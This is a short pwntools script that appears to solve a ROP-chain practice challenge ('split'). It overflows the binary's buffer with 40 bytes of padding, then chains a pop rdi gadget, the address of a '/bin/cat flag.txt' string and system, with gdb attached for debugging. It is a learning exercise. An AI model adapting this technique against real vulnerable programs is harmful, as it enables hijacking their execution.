# import pwntools
from pwn import *

# setup split context
context.terminal = ['tmux', 'splitw', '-h']

# initiate the process
io = process('./split')

# attach gdb, and break at 'main'
gdb.attach(io, '''
break main
''')

# cyclic for finding offset
cyclic = cyclic(100)

# setup the pad
pad = b'a'*40

# start building the rop chain
chain =  p64(0x4007c3) # address of pop rdi; ret;
chain += p64(0x601060) # address of userfulString -- '/bin/cat flag.txt'
chain += p64(0x40074b) # address of system call

exploit = pad + chain

# exploit some stuff
io.sendafter(b'> ', exploit)

# ensure we hold the window open
io.interactive()
